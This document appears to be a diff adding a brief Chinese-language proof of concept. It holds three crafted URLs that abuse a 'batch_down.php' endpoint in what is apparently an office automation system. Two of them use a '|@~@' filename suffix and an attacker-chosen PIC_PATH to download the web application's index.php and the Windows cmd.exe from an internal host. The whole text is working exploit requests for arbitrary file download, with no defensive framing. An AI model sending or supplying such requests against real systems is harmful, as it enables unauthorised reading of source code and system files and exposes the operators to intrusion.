@@ -1,0 +1,8 @@
+下载项目图片：
+http://172.16.106.36/general/picture/batch_down.php?TmpFileNameStr=DSCN0292.jpg&SUB_DIR=&PIC_PATH=d:/myoa/%D4%B1%B9%A4%BB%EE 
+
+下载项目index.php文件：
+http://172.16.106.36/general/picture/batch_down.php?TmpFileNameStr=index.php|@~@&SUB_DIR=&PIC_PATH=d:/myoa/webroot
+
+下载系统文件：
+http://172.16.106.36/general/picture/batch_down.php?TmpFileNameStr=cmd.exe|@~@&SUB_DIR=&PIC_PATH=c:/windows/system32
